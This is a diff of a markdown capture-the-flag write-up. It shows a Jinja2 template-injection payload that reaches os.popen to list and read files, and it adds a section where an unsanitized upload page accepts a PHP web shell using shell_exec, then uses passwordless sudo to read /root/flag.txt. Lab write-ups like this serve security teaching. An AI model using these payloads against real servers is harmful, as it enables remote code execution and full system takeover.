@@ -16,18 +16,30 @@
 
   `$(7*7)` simply returns that literal string. Writing `{{7*7}}`, however, returns `49`. Sending `{{7*'7'}}` gives back `7777777`, suggesting the server might be running **Jinja2**.
   Now we can run commands like this one: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` to see the files in the directory. Doing this we find a `flag` file.
-  Naturally, we try to read this file: `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` which returns the flag successfully.
-
-  
-
-
-
-
-
-  
+  Naturally, we try to read this file: `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}` which returns the flag successfully.  
 </details>
 
+<details open>
+<summary>n0s4n1ty 1</summary>
 
+When entering the machine, we are presented a page where the user can upload a profile picture. First we will try to exploit this by checking if the input is sanitized. Trying to upload some `test.txt` file, and navigating to `/uploads/test.txt` as indicated by the upload page, we see the input is indeed not sanitized, since we are able to upload _any_ type of file. Next, we start trying differet commands in a `php` file:
+```php
+<?php
+
+echo getcwd();
+
+?>
+```
+which successfully returns the path `/var/www/html/uploads` . Knowing the structure, we try `ls /` and see where the `root` folder is. Now we can test if we may be able to `sudo` commands. Adding `sudo -l` we obtain:
+```
+...
+User www-data may run the following commands on challenge:
+    (ALL) NOPASSWD: ALL
+```
+Meaningg we can `sudo` whatever we want. So, we attempt `echo shell_exec('sudo ls /root')` and find `flag.txt` in that folder. 
+
+Finally, adding the line `echo shell_exec('sudo cat /root/flag.txt')` gives us the flag.
+</details>
 
 
 
